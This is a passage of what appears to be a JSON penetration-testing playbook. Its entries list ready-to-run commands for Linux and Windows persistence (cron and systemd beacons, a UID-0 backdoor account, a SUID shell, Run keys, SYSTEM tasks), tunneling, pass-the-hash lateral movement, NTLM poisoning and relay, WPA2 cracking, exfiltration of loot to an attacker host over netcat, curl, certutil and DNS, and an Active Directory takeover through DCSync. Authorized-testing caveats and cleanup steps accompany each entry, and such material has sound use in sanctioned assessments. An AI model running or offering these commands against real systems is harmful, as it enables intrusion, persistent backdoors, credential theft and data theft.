      "do": "Install a root cron beacon with a marker comment",
      "cmd": "(crontab -l 2>/dev/null; echo '*/10 * * * * /usr/local/bin/.beacon # DN-ENGAGE') | crontab -",
      "note": "The marker makes the line trivial to grep and delete."
     },
     {
      "do": "Write a systemd unit for reboot-surviving persistence",
      "cmd": "printf '[Unit]\\nDescription=netcfg\\n[Service]\\nExecStart=/usr/local/bin/.beacon\\nRestart=always\\n[Install]\\nWantedBy=multi-user.target\\n' > /etc/systemd/system/netcfg.service"
     },
     {
      "do": "Enable and start the service",
      "cmd": "systemctl daemon-reload && systemctl enable --now netcfg.service"
     },
     {
      "do": "Optionally pair a timer for jittered callbacks",
      "cmd": "systemctl list-timers --all | head",
      "note": "A .timer unit beside the .service schedules periodic runs."
     }
    ]
   },
   {
    "name": "Account and SUID footholds",
    "steps": [
     {
      "do": "Create a low-profile UID-0 backup account",
      "cmd": "useradd -o -u 0 -g 0 -M -d /root -s /bin/bash svc-backup && echo 'svc-backup:P@ssw0rd!' | chpasswd",
      "note": "Record the exact username for deletion."
     },
     {
      "do": "Plant a SUID-root shell copy as a fallback",
      "cmd": "cp /bin/bash /usr/local/bin/.dn && chown root:root /usr/local/bin/.dn && chmod 4755 /usr/local/bin/.dn",
      "note": "Trigger with /usr/local/bin/.dn -p."
     },
     {
      "do": "Add a web-user cron for a web-only pivot",
      "cmd": "echo '* * * * * www-data /usr/local/bin/.beacon' >> /etc/cron.d/wwwjob",
      "note": "Use only when the web user is your single foothold."
     }
    ]
   }
  ],
  "verify": "From the attacker box confirm each mechanism independently: ssh -i key logs in, the listener receives the cron and service callbacks, and su to the new account succeeds.",
  "cleanup": "Remove every artifact: delete the authorized_keys line and the .bashrc line, restore cron with crontab - < /tmp/.cron.bak, rm /etc/cron.d/wwwjob, systemctl disable --now netcfg.service && rm /etc/systemd/system/netcfg.service && systemctl daemon-reload, userdel -r svc-backup, rm -f /usr/local/bin/.dn /usr/local/bin/.beacon.",
  "safety": "Persistence is planted only with explicit client sign-off and must be fully removed before the engagement closes; keep the written artifact log so nothing is left behind."
 },
 {
  "id": "windows-persistence-backdoors",
  "title": "Windows Persistence & Backdoors",
  "cat": "Persistence",
  "goal": "Establish documented, reversible re-entry to an authorized Windows host that survives reboots and logoffs during the test.",
  "when": "After reaching administrator or SYSTEM and the rules of engagement explicitly authorize persistence testing.",
  "risk": "high",
  "tools": [
   "schtasks",
   "reg",
   "sc",
   "net user",
   "powershell"
  ],
  "mitre": [
   "T1547.001 Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder",
   "T1053.005 Scheduled Task/Job: Scheduled Task",
   "T1543.003 Create or Modify System Process: Windows Service",
   "T1136.001 Create Account: Local Account",
   "T1546.003 Event Triggered Execution: Windows Management Instrumentation Event Subscription"
  ],
  "phases": [
   {
    "name": "Prepare and record",
    "steps": [
     {
      "do": "Confirm elevation and context",
      "cmd": "whoami /groups | findstr /i \"S-1-5-32-544 S-1-16-12288\"",
      "note": "Admin and high integrity are needed for HKLM and service persistence."
     },
     {
      "do": "Snapshot the Run keys before editing",
      "cmd": "reg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run > %TEMP%\\run.bak"
     },
     {
      "do": "Stage the payload path you will reference",
      "cmd": "copy beacon.exe C:\\ProgramData\\msupdate.exe",
      "note": "Keep a written list of every path and key touched."
     }
    ]
   },
   {
    "name": "Autostart footholds",
    "steps": [
     {
      "do": "Add an HKLM Run key for boot persistence",
      "cmd": "reg add HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v msupdate /t REG_SZ /d \"C:\\ProgramData\\msupdate.exe\" /f"
     },
     {
      "do": "Drop a shortcut in the all-users startup folder",
      "cmd": "copy beacon.exe \"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\msupdate.exe\""
     },
     {
      "do": "Add a RunOnce key for a single-shot trigger",
      "cmd": "reg add HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce /v dn /t REG_SZ /d \"C:\\ProgramData\\msupdate.exe\" /f"
     }
    ]
   },
   {
    "name": "Scheduled task and service footholds",
    "steps": [
     {
      "do": "Create a SYSTEM task that runs at logon",
      "cmd": "schtasks /create /tn \"MicrosoftEdgeUpdateTaskDN\" /tr \"C:\\ProgramData\\msupdate.exe\" /sc onlogon /ru SYSTEM /rl HIGHEST /f"
     },
     {
      "do": "Add a periodic task for resilient callbacks",
      "cmd": "schtasks /create /tn \"OneDriveSyncDN\" /tr \"C:\\ProgramData\\msupdate.exe\" /sc minute /mo 30 /ru SYSTEM /f"
     },
     {
      "do": "Create an auto-start service as SYSTEM",
      "cmd": "sc create WinNetSvcDN binPath= \"C:\\ProgramData\\msupdate.exe\" start= auto && sc start WinNetSvcDN"
     },
     {
      "do": "Note a WMI event subscription as a fileless option",
      "cmd": "powershell -ep bypass -c \"Get-WmiObject -Namespace root\\subscription -Class __EventFilter\"",
      "note": "A permanent __EventFilter + CommandLineConsumer binding is stealthy; record all three objects for removal."
     }
    ]
   },
   {
    "name": "Account and access footholds",
    "steps": [
     {
      "do": "Create a local backup account and add it to admins",
      "cmd": "net user svc-backup P@ssw0rd! /add && net localgroup administrators svc-backup /add",
      "note": "Record the exact username."
     },
     {
      "do": "Enable RDP for interactive re-entry",
      "cmd": "reg add \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 0 /f && netsh advfirewall firewall set rule group=\"remote desktop\" new enable=Yes",
      "note": "Note the prior fDenyTSConnections value to restore it."
     },
     {
      "do": "Add the backup user to the Remote Desktop group",
      "cmd": "net localgroup \"Remote Desktop Users\" svc-backup /add"
     }
    ]
   }
  ],
  "verify": "Confirm each mechanism independently: the beacon returns after reboot and logon, the service and tasks appear with sc query / schtasks /query, and RDP as the backup user connects.",
  "cleanup": "Remove every artifact: reg delete the Run and RunOnce values, del the startup shortcut, schtasks /delete /tn for each task, sc stop WinNetSvcDN && sc delete WinNetSvcDN, net user svc-backup /delete, remove the WMI filter/consumer/binding, restore fDenyTSConnections to its prior value, and del C:\\ProgramData\\msupdate.exe.",
  "safety": "Persistence is planted only with explicit client sign-off and must be fully removed before the engagement closes; keep the written artifact log so nothing is left behind."
 },
 {
  "id": "pivoting-and-tunneling",
  "title": "Pivoting & Tunneling",
  "cat": "Lateral Movement",
  "goal": "Use a foothold host and discovered credentials to route traffic into unreachable internal subnets.",
  "when": "After compromising a dual-homed or internal host that can see networks your attack box cannot.",
  "risk": "medium",
  "tools": [
   "ssh",
   "proxychains",
   "chisel",
   "ligolo-ng",
   "sshuttle",
   "socat"
  ],
  "mitre": [
   "T1090 Proxy",
   "T1572 Protocol Tunneling",
   "T1021 Remote Services",
   "T1021.004 SSH"
  ],
  "phases": [
   {
    "name": "SSH port forwarding",
    "steps": [
     {
      "do": "Local forward a single internal service to your loopback",
      "cmd": "ssh -N -L 8080:10.10.20.5:80 <USER>@<IP>",
      "note": "Reach internal web app at 127.0.0.1:8080"
     },
     {
      "do": "Remote forward your listener back through the victim",
      "cmd": "ssh -N -R 9001:127.0.0.1:9001 <USER>@<IP>",
      "note": "Pull a callback from a segment that can only reach the pivot"
     },
     {
      "do": "Dynamic SOCKS proxy for whole-subnet access",
      "cmd": "ssh -N -D 1080 <USER>@<IP>",
      "note": "SOCKS4/5 proxy on 127.0.0.1:1080"
     },
     {
      "do": "Add a reusable key-based pivot entry",
      "cmd": "ssh -i pivot_key -o StrictHostKeyChecking=no -N -D 1080 <USER>@<IP>"
     }
    ]
   },
   {
    "name": "proxychains over the SOCKS proxy",
    "steps": [
     {
      "do": "Point proxychains at the dynamic proxy",
      "cmd": "sed -i 's/^socks4.*/socks5 127.0.0.1 1080/' /etc/proxychains4.conf"
     },
     {
      "do": "Prefer quiet mode and proxy_dns",
      "cmd": "grep -qxF 'quiet_mode' /etc/proxychains4.conf || sed -i '1i quiet_mode' /etc/proxychains4.conf"
     },
     {
      "do": "Scan the internal range through the tunnel",
      "cmd": "proxychains4 nmap -sT -Pn -n -p 445,3389,5985 10.10.20.0/24"
     },
     {
      "do": "Pivot an interactive tool",
      "cmd": "proxychains4 crackmapexec smb 10.10.20.0/24 -u <USER> -p 'Passw0rd!'"
     }
    ]
   },
   {
    "name": "chisel reverse SOCKS",
    "steps": [
     {
      "do": "Start the chisel server with reverse and SOCKS enabled on your box",
      "cmd": "chisel server -p 8000 --reverse --socks5"
     },
     {
      "do": "Run the agent on the pivot pointing back at you",
      "cmd": "chisel client $LHOST:8000 R:1080:socks"
     },
     {
      "do": "Route tools through the resulting SOCKS listener",
      "cmd": "proxychains4 -f /etc/proxychains4.conf impacket-smbclient <DOMAIN>/<USER>@10.10.20.5"
     },
     {
      "do": "Forward one TCP port instead of SOCKS when needed",
      "cmd": "chisel client $LHOST:8000 R:13389:10.10.20.5:3389"
     }
    ]
   },
   {
    "name": "ligolo-ng tunnel",
    "steps": [
     {
      "do": "Create the tun interface on your box",
      "cmd": "sudo ip tuntap add user $(whoami) mode tun ligolo && sudo ip link set ligolo up"
     },
     {
      "do": "Start the ligolo-ng proxy with a self-signed cert",
      "cmd": "ligolo-proxy -selfcert -laddr 0.0.0.0:11601"
     },
     {
      "do": "Run the agent on the pivot",
      "cmd": "./agent -connect $LHOST:11601 -ignore-cert"
     },
     {
      "do": "Add a route to the internal subnet via the tun",
      "cmd": "sudo ip route add 10.10.20.0/24 dev ligolo",
      "note": "In the proxy session run start to begin tunneling"
     }
    ]
   },
   {
    "name": "sshuttle and socat fallbacks",
    "steps": [
     {
      "do": "VPN-like routing over SSH with sshuttle",
      "cmd": "sshuttle -r <USER>@<IP> 10.10.20.0/24 --dns -x <IP>"
     },
     {
      "do": "socat TCP relay from the pivot to an internal host",
      "cmd": "socat TCP-LISTEN:33389,fork,reuseaddr TCP:10.10.20.5:3389"
     },
     {
      "do": "socat encrypted relay for a loud channel",
      "cmd": "socat OPENSSL-LISTEN:4443,cert=pivot.pem,verify=0,fork TCP:10.10.20.5:445"
     },
     {
      "do": "Reach the relayed service from your box",
      "cmd": "xfreerdp /v:<IP>:33389 /u:<USER> /p:'Passw0rd!'"
     }
    ]
   }
  ],
  "verify": "Confirm internal hosts respond through the tunnel with a scan or a service login that fails to connect directly.",
  "cleanup": "Kill ssh/chisel/ligolo/sshuttle processes, remove added ip routes and tun interfaces, and revert proxychains4.conf.",
  "safety": "Only pivot inside networks explicitly named in your engagement scope."
 },
 {
  "id": "lateral-movement-impacket-cme",
  "title": "Lateral Movement with Impacket & CrackMapExec",
  "cat": "Lateral Movement",
  "goal": "Spray validated credentials across Windows hosts and execute commands where the account is local admin.",
  "when": "After recovering domain or local credentials or NTLM hashes during an internal engagement.",
  "risk": "high",
  "tools": [
   "crackmapexec",
   "impacket-psexec",
   "impacket-wmiexec",
   "evil-winrm",
   "xfreerdp"
  ],
  "mitre": [
   "T1021.002 SMB/Windows Admin Shares",
   "T1550.002 Pass the Hash",
   "T1569.002 Service Execution",
   "T1021.006 Windows Remote Management",
   "T1021.001 Remote Desktop Protocol"
  ],
  "phases": [
   {
    "name": "Validate credentials at scale",
    "steps": [
     {
      "do": "Spray a password across the subnet over SMB",
      "cmd": "crackmapexec smb 10.10.20.0/24 -u <USER> -p 'Passw0rd!' -d <DOMAIN>"
     },
     {
      "do": "Find hosts where the account is local admin (Pwn3d!)",
      "cmd": "crackmapexec smb 10.10.20.0/24 -u <USER> -p 'Passw0rd!' -d <DOMAIN> | grep Pwn3d"
     },
     {
      "do": "Validate a recovered hash instead of a password",
      "cmd": "crackmapexec smb 10.10.20.0/24 -u <USER> -H <HASH> -d <DOMAIN>"
     },
     {
      "do": "Enumerate logged-on users and shares on admin hosts",
      "cmd": "crackmapexec smb 10.10.20.5 -u <USER> -p 'Passw0rd!' -d <DOMAIN> --loggedon-users --shares"
     }
    ]
   },
   {
    "name": "Remote execution choices",
    "steps": [
     {
      "do": "Full SYSTEM shell via service creation",
      "cmd": "impacket-psexec <DOMAIN>/<USER>:'Passw0rd!'@10.10.20.5"
     },
     {
      "do": "Quieter WMI exec without dropping a service",
      "cmd": "impacket-wmiexec <DOMAIN>/<USER>:'Passw0rd!'@10.10.20.5"
     },
     {
      "do": "SMB named-pipe exec as a fallback",
      "cmd": "impacket-smbexec <DOMAIN>/<USER>:'Passw0rd!'@10.10.20.5"
     },
     {
      "do": "Scheduled-task exec when SMB exec is blocked",
      "cmd": "impacket-atexec <DOMAIN>/<USER>:'Passw0rd!'@10.10.20.5 whoami"
     }
    ]
   },
   {
    "name": "Pass-the-hash execution",
    "steps": [
     {
      "do": "PsExec with an NTLM hash, no password",
      "cmd": "impacket-psexec -hashes :<HASH> <DOMAIN>/<USER>@10.10.20.5"
     },
     {
      "do": "WMI exec with a hash",
      "cmd": "impacket-wmiexec -hashes :<HASH> <DOMAIN>/<USER>@10.10.20.5"
     },
     {
      "do": "Mass command exec by hash with CME",
      "cmd": "crackmapexec smb 10.10.20.0/24 -u <USER> -H <HASH> -d <DOMAIN> -x 'whoami /all'"
     }
    ]
   },
   {
    "name": "WinRM and RDP interactive access",
    "steps": [
     {
      "do": "Interactive WinRM shell with a password",
      "cmd": "evil-winrm -i 10.10.20.5 -u <USER> -p 'Passw0rd!'"
     },
     {
      "do": "WinRM shell using a hash",
      "cmd": "evil-winrm -i 10.10.20.5 -u <USER> -H <HASH>"
     },
     {
      "do": "RDP session with clipboard and drive redirect",
      "cmd": "xfreerdp /v:10.10.20.5 /u:<USER> /p:'Passw0rd!' /d:<DOMAIN> /cert:ignore +clipboard /drive:loot,/tmp/loot"
     },
     {
      "do": "Pass-the-hash RDP when Restricted Admin is enabled",
      "cmd": "xfreerdp /v:10.10.20.5 /u:<USER> /pth:<HASH> /d:<DOMAIN> /cert:ignore"
     }
    ]
   },
   {
    "name": "Command exec and file transfer",
    "steps": [
     {
      "do": "Run a command on every admin host",
      "cmd": "crackmapexec smb 10.10.20.0/24 -u <USER> -H <HASH> -d <DOMAIN> -x 'hostname'"
     },
     {
      "do": "Dump local SAM hashes remotely",
      "cmd": "crackmapexec smb 10.10.20.5 -u <USER> -p 'Passw0rd!' -d <DOMAIN> --sam"
     },
     {
      "do": "Upload a tool through an evil-winrm session",
      "cmd": "evil-winrm -i 10.10.20.5 -u <USER> -p 'Passw0rd!' -s /opt/scripts",
      "note": "Use upload/download inside the session"
     },
     {
      "do": "Pull a file over SMB with impacket",
      "cmd": "impacket-smbclient <DOMAIN>/<USER>:'Passw0rd!'@10.10.20.5"
     }
    ]
   }
  ],
  "verify": "Confirm a returned shell or command output (hostname, whoami) from the target proves the credential and exec path.",
  "cleanup": "Remove uploaded tools, delete services/scheduled tasks created by exec modules, and clear temp artifacts left in C:\\Windows\\Temp.",
  "safety": "Execute only against hosts enumerated within the authorized target list."
 },
 {
  "id": "network-poisoning-mitm",
  "title": "Network Poisoning & MITM",
  "cat": "Network",
  "goal": "Capture and relay NTLM authentication by poisoning name resolution and intercepting traffic on the local segment.",
  "when": "On an internal assessment where you have a wired or wireless foothold on the target broadcast domain.",
  "risk": "high",
  "tools": [
   "responder",
   "mitm6",
   "impacket-ntlmrelayx",
   "bettercap",
   "arpspoof",
   "tcpdump"
  ],
  "mitre": [
   "T1557.001 LLMNR/NBT-NS Poisoning and SMB Relay",
   "T1557 Adversary-in-the-Middle",
   "T1040 Network Sniffing",
   "T1187 Forced Authentication"
  ],
  "phases": [
   {
    "name": "LLMNR/NBT-NS/mDNS capture",
    "steps": [
     {
      "do": "Run Responder to poison name resolution and grab NetNTLMv2",
      "cmd": "responder -I <INTERFACE> -wv"
     },
     {
      "do": "Watch for captured hashes in the log directory",
      "cmd": "ls -la /usr/share/responder/logs/"
     },
     {
      "do": "Crack a captured NetNTLMv2 hash offline",
      "cmd": "hashcat -m 5600 captured_ntlmv2.txt /usr/share/wordlists/rockyou.txt"
     }
    ]
   },
   {
    "name": "SMB relay chain",
    "steps": [
     {
      "do": "Disable Responder SMB/HTTP so relay can bind them",
      "cmd": "sed -i 's/SMB = On/SMB = Off/; s/HTTP = On/HTTP = Off/' /usr/share/responder/Responder.conf"
     },
     {
      "do": "Relay captured auth to targets lacking SMB signing",
      "cmd": "impacket-ntlmrelayx -tf targets.txt -smb2support -socks"
     },
     {
      "do": "Run Responder alongside to feed the relay",
      "cmd": "responder -I <INTERFACE> -wv",
      "note": "Responder poisons, ntlmrelayx forwards the auth"
     },
     {
      "do": "Use the relayed SOCKS session through proxychains",
      "cmd": "proxychains4 crackmapexec smb <TARGET> -u <USER> -p '' --no-bruteforce"
     }
    ]
   },
   {
    "name": "mitm6 IPv6 DNS takeover",
    "steps": [
     {
      "do": "Advertise your box as the IPv6 DNS server",
      "cmd": "mitm6 -d <DOMAIN>"
     },
     {
      "do": "Relay the coerced auth to LDAP for delegation abuse",
      "cmd": "impacket-ntlmrelayx -6 -t ldaps://<IP> -wh fakewpad.<DOMAIN> --delegate-access"
     },
     {
      "do": "Relay to LDAP to dump the domain instead",
      "cmd": "impacket-ntlmrelayx -6 -t ldap://<IP> -wh fakewpad.<DOMAIN> --dump-adcs"
     }
    ]
   },
   {
    "name": "ARP spoofing and sniffing",
    "steps": [
     {
      "do": "Enable IP forwarding before spoofing",
      "cmd": "sysctl -w net.ipv4.ip_forward=1"
     },
     {
      "do": "Full-duplex ARP spoof with bettercap",
      "cmd": "bettercap -iface <INTERFACE> -eval 'set arp.spoof.targets <TARGET>; arp.spoof on; net.sniff on'"
     },
     {
      "do": "Classic two-way arpspoof against a host and gateway",
      "cmd": "arpspoof -i <INTERFACE> -t <TARGET> <IP>"
     },
     {
      "do": "Capture the intercepted traffic for later analysis",
      "cmd": "tcpdump -i <INTERFACE> -w mitm_capture.pcap host <TARGET>"
     }
    ]
   },
   {
    "name": "Act on captured material",
    "steps": [
     {
      "do": "Pass a cracked credential to confirm access",
      "cmd": "crackmapexec smb <TARGET> -u <USER> -p 'Cracked123'"
     },
     {
      "do": "Extract plaintext secrets from the pcap",
      "cmd": "tcpdump -r mitm_capture.pcap -A | grep -iE 'pass|user|auth'"
     },
     {
      "do": "Review relay results for pwned targets",
      "cmd": "cat ntlmrelayx_output/*.json"
     }
    ]
   }
  ],
  "verify": "Confirm captured NetNTLMv2 hashes appear in Responder logs or that ntlmrelayx reports a successful relay to a target.",
  "cleanup": "Stop Responder/mitm6/bettercap/arpspoof, set net.ipv4.ip_forward back to 0, and restore Responder.conf.",
  "safety": "Poisoning and relaying must be confined to the broadcast domain and hosts named in your signed scope."
 },
 {
  "id": "wireless-wpa2-attacks",
  "title": "Wireless (WPA2/WPA) Attacks",
  "cat": "Wireless",
  "goal": "Recover a WPA/WPA2 pre-shared key on a wireless network you own or are authorized to test.",
  "when": "During an authorized wireless assessment of a network under your control or explicit written contract.",
  "risk": "high",
  "tools": [
   "airmon-ng",
   "airodump-ng",
   "aireplay-ng",
   "aircrack-ng",
   "hcxdumptool",
   "hashcat",
   "wifite",
   "reaver"
  ],
  "mitre": [
   "T1040 Network Sniffing",
   "T1557 Adversary-in-the-Middle",
   "T1110.002 Password Cracking",
   "T1200 Hardware Additions"
  ],
  "phases": [
   {
    "name": "Monitor mode and discovery",
    "steps": [
     {
      "do": "Stop interfering processes",
      "cmd": "airmon-ng check kill"
     },
     {
      "do": "Enable monitor mode on your adapter",
      "cmd": "airmon-ng start <INTERFACE>"
     },
     {
      "do": "Survey nearby networks and clients",
      "cmd": "airodump-ng <INTERFACE>mon"
     },
     {
      "do": "Lock onto your target and log to disk",
      "cmd": "airodump-ng --bssid <BSSID> -c <CHANNEL> -w handshake <INTERFACE>mon"
     }
    ]
   },
   {
    "name": "Capture a 4-way handshake",
    "steps": [
     {
      "do": "Deauth a connected client to force reauth",
      "cmd": "aireplay-ng --deauth 5 -a <BSSID> -c <TARGET> <INTERFACE>mon",
      "note": "Only deauth clients on your authorized network"
     },
     {
      "do": "Confirm the WPA handshake banner in airodump-ng",
      "cmd": "airodump-ng --bssid <BSSID> -c <CHANNEL> -w handshake <INTERFACE>mon"
     },
     {
      "do": "Verify the capture actually holds a handshake",
      "cmd": "aircrack-ng handshake-01.cap"
     }
    ]
   },
   {
    "name": "Crack the handshake",
    "steps": [
     {
      "do": "Dictionary attack with aircrack-ng",
      "cmd": "aircrack-ng -w /usr/share/wordlists/rockyou.txt -b <BSSID> handshake-01.cap"
     },
     {
      "do": "Convert the capture to hashcat 22000 format",
      "cmd": "hcxpcapngtool -o hash.22000 handshake-01.cap"
     },
     {
      "do": "GPU crack with hashcat mode 22000",
      "cmd": "hashcat -m 22000 hash.22000 /usr/share/wordlists/rockyou.txt"
     },
     {
      "do": "Apply a rule set for mangled candidates",
      "cmd": "hashcat -m 22000 hash.22000 /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule"
     }
    ]
   },
   {
    "name": "Clientless PMKID attack",
    "steps": [
     {
      "do": "Capture PMKID frames without deauth",
      "cmd": "hcxdumptool -i <INTERFACE>mon -o pmkid.pcapng --enable_status=1"
     },
     {
      "do": "Extract the PMKID hash in 22000 format",
      "cmd": "hcxpcapngtool -o pmkid.22000 pmkid.pcapng"
     },
     {
      "do": "Crack the PMKID with hashcat",
      "cmd": "hashcat -m 22000 pmkid.22000 /usr/share/wordlists/rockyou.txt"
     }
    ]
   },
   {
    "name": "WPS and one-shot automation",
    "steps": [
     {
      "do": "Enumerate WPS-enabled access points",
      "cmd": "wash -i <INTERFACE>mon"
     },
     {
      "do": "Pixie-dust WPS attack with reaver",
      "cmd": "reaver -i <INTERFACE>mon -b <BSSID> -c <CHANNEL> -K 1 -vv"
     },
     {
      "do": "Brute the WPS PIN with bully as a fallback",
      "cmd": "bully -b <BSSID> -c <CHANNEL> -d <INTERFACE>mon"
     },
     {
      "do": "Automate the whole flow with wifite",
      "cmd": "wifite --bssid <BSSID> -c <CHANNEL> --kill"
     }
    ]
   }
  ],
  "verify": "Confirm aircrack-ng or hashcat prints the recovered PSK, or that a captured handshake validates.",
  "cleanup": "Return the adapter to managed mode with airmon-ng stop and restart NetworkManager, then securely delete captures and cracked keys.",
  "safety": "Run these attacks only against wireless networks you own or are explicitly contracted to test; deauthing third-party networks is illegal."
 },
 {
  "id": "data-exfiltration-staging",
  "title": "Data Exfiltration & Staging",
  "cat": "Exfiltration",
  "goal": "Stage, encrypt, and move collected data off a target through controlled channels during an authorized test.",
  "when": "After reaching objective data and needing to demonstrate exfiltration capability to the client.",
  "risk": "high",
  "tools": [
   "tar",
   "scp",
   "nc",
   "impacket-smbserver",
   "openssl",
   "dnscat2",
   "curl",
   "certutil"
  ],
  "mitre": [
   "T1560.001 Archive via Utility",
   "T1048 Exfiltration Over Alternative Protocol",
   "T1041 Exfiltration Over C2 Channel",
   "T1071.004 DNS",
   "T1030 Data Transfer Size Limits"
  ],
  "phases": [
   {
    "name": "Stage and compress",
    "steps": [
     {
      "do": "Archive and compress the target directory",
      "cmd": "tar -czf /tmp/loot.tar.gz /srv/data"
     },
     {
      "do": "Create an encrypted 7z archive with a password",
      "cmd": "7z a -p'S3cret!' -mhe=on /tmp/loot.7z /srv/data"
     },
     {
      "do": "Split a large archive into transfer-sized chunks",
      "cmd": "split -b 50M /tmp/loot.tar.gz /tmp/loot.part."
     },
     {
      "do": "Record hashes to verify integrity after transfer",
      "cmd": "sha256sum /tmp/loot.tar.gz > /tmp/loot.sha256"
     }
    ]
   },
   {
    "name": "Encrypt before transit",
    "steps": [
     {
      "do": "Symmetric encrypt with OpenSSL AES-256",
      "cmd": "openssl enc -aes-256-cbc -pbkdf2 -salt -in /tmp/loot.tar.gz -out /tmp/loot.enc"
     },
     {
      "do": "Encrypt to a recipient with GPG",
      "cmd": "gpg --encrypt --recipient tester@lab /tmp/loot.tar.gz"
     },
     {
      "do": "Decrypt on your receiving box",
      "cmd": "openssl enc -d -aes-256-cbc -pbkdf2 -in loot.enc -out loot.tar.gz"
     }
    ]
   },
   {
    "name": "Transfer channels",
    "steps": [
     {
      "do": "Copy out over SSH",
      "cmd": "scp /tmp/loot.enc <USER>@$LHOST:/tmp/"
     },
     {
      "do": "Netcat push to a listening collector",
      "cmd": "nc -w 3 $LHOST 4444 < /tmp/loot.enc",
      "note": "Collector: nc -lvnp 4444 > loot.enc"
     },
     {
      "do": "Serve files and pull with curl/wget",
      "cmd": "python3 -m http.server 8000",
      "note": "Victim: curl -s http://$LHOST:8000/loot.enc -o loot.enc"
     },
     {
      "do": "Host an SMB share to drag files out",
      "cmd": "impacket-smbserver share /tmp/share -smb2support",
      "note": "Windows: copy loot.enc \\\\$LHOST\\share\\"
     }
    ]
   },
   {
    "name": "Windows living-off-the-land transfer",
    "steps": [
     {
      "do": "Download a tool with certutil",
      "cmd": "certutil -urlcache -split -f http://$LHOST:8000/nc.exe C:\\Windows\\Temp\\nc.exe"
     },
     {
      "do": "Base64-encode loot with certutil for safe transit",
      "cmd": "certutil -encode C:\\loot.zip C:\\loot.b64"
     },
     {
      "do": "Exfil with a PowerShell web upload",
      "cmd": "powershell -c \"Invoke-RestMethod -Uri http://$LHOST:8000/up -Method Post -InFile C:\\loot.b64\""
     }
    ]
   },
   {
    "name": "Covert channels and throttling",
    "steps": [
     {
      "do": "Start a dnscat2 server on an authoritative domain",
      "cmd": "dnscat2-server exfil.<DOMAIN>"
     },
     {
      "do": "Connect the dnscat2 client from the target",
      "cmd": "dnscat2-client exfil.<DOMAIN>"
     },
     {
      "do": "Tunnel data over ICMP as an alternative",
      "cmd": "iodine -f -P sharedsecret <IP> tunnel.<DOMAIN>"
     },
     {
      "do": "Throttle transfer rate to stay under DLP thresholds",
      "cmd": "scp -l 256 /tmp/loot.enc <USER>@$LHOST:/tmp/",
      "note": "256 Kbit/s cap, educational pacing"
     }
    ]
   }
  ],
  "verify": "Confirm the sha256sum of the received file matches the one recorded on the target before exfiltration.",
  "cleanup": "Securely delete staged archives and keys with shred, stop HTTP/SMB/dnscat2 listeners, and remove tools dropped on the target.",
  "safety": "Exfiltrate only data and over channels the engagement rules of engagement explicitly permit."
 },
 {
  "id": "active-directory-attack-chain",
  "title": "Active Directory Attack Chain",
  "cat": "Active Directory",
  "goal": "Move from an unprivileged domain foothold to full domain compromise by chaining enumeration, roasting, ACL abuse, and DCSync.",
  "when": "After obtaining valid low-privilege domain credentials or an anonymous bind on an engagement with AD in scope.",
  "risk": "high",
  "tools": [
   "bloodhound-python",
   "impacket-GetNPUsers",
   "impacket-GetUserSPNs",
   "impacket-secretsdump",
   "crackmapexec",
   "hashcat"
  ],
  "mitre": [
   "T1087.002 Account Discovery: Domain Account",
   "T1558.004 AS-REP Roasting",
   "T1558.003 Kerberoasting",
   "T1003.006 OS Credential Dumping: DCSync",
   "T1550.003 Use Alternate Authentication Material: Pass the Ticket",
   "T1484.001 Domain Policy Modification: GPO"
  ],
  "phases": [
   {
    "name": "Enumeration",
    "steps": [
     {
      "do": "Anonymous/authenticated LDAP sweep for naming context and users",
      "cmd": "ldapsearch -x -H ldap://<DC-IP> -b 'DC=<DOMAIN>,DC=local' '(objectClass=user)' sAMAccountName",
      "note": "Bind with -D '<DOMAIN>\\<USER>' -w '<PASS>' if anonymous bind is denied."
     },
     {
      "do": "Run enum4linux-ng for users, shares, and password policy",
      "cmd": "enum4linux-ng -A -u '<USER>' -p '<PASS>' <DC-IP>"
     },
     {
      "do": "Validate creds and list domain users via SMB",
      "cmd": "crackmapexec smb <DC-IP> -u '<USER>' -p '<PASS>' --users"
     },
     {
      "do": "Collect full graph for attack-path analysis",
      "cmd": "bloodhound-python -d <DOMAIN> -u '<USER>' -p '<PASS>' -ns <DC-IP> -c All --zip",
      "note": "Import the zip into the BloodHound GUI and mark the foothold as Owned."
     }
    ]
   },
   {
    "name": "Credential roasting",
    "steps": [
     {
      "do": "AS-REP roast accounts with Kerberos preauth disabled",
      "cmd": "impacket-GetNPUsers <DOMAIN>/ -usersfile users.txt -dc-ip <DC-IP> -format hashcat -outputfile asrep.hash"
     },
     {
      "do": "Crack AS-REP hashes (mode 18200)",
      "cmd": "hashcat -m 18200 asrep.hash /usr/share/wordlists/rockyou.txt"
     },
     {
      "do": "Kerberoast all SPN-bearing service accounts",
      "cmd": "impacket-GetUserSPNs <DOMAIN>/<USER>:'<PASS>' -dc-ip <DC-IP> -request -outputfile spn.hash"
     },
     {
      "do": "Crack TGS hashes (mode 13100)",
      "cmd": "hashcat -m 13100 spn.hash /usr/share/wordlists/rockyou.txt"
     }
    ]
   },
   {
    "name": "ACL abuse",
    "steps": [
     {
      "do": "Review BloodHound for GenericAll/WriteDacl edges from owned principals",
      "cmd": "echo 'In BloodHound run: Shortest Paths from Owned Principals' ",
      "note": "Target users/groups where you hold GenericAll, ForceChangePassword, or WriteDacl."
     },
     {
      "do": "Reset a target user's password via ForceChangePassword edge",
      "cmd": "net rpc password '<USER>' 'Newpass123!' -U '<DOMAIN>'/'<USER>'%'<PASS>' -S <DC-IP>"
     },
     {
      "do": "Grant yourself DCSync rights via WriteDacl on the domain object",
      "cmd": "impacket-dacledit -action write -rights DCSync -principal '<USER>' -target-dn 'DC=<DOMAIN>,DC=local' '<DOMAIN>'/'<USER>':'<PASS>'"
     },
     {
      "do": "Add owned user to a privileged group via GenericAll on the group",
      "cmd": "net rpc group addmem 'Domain Admins' '<USER>' -U '<DOMAIN>'/'<USER>'%'<PASS>' -S <DC-IP>"
     }
    ]
   },
   {
    "name": "Domain compromise",
    "steps": [
     {
      "do": "DCSync the krbtgt and admin hashes from the DC",
      "cmd": "impacket-secretsdump '<DOMAIN>'/'<USER>':'<PASS>'@<DC-IP> -just-dc"
     },
     {
      "do": "Pass-the-hash as a Domain Admin to confirm access",
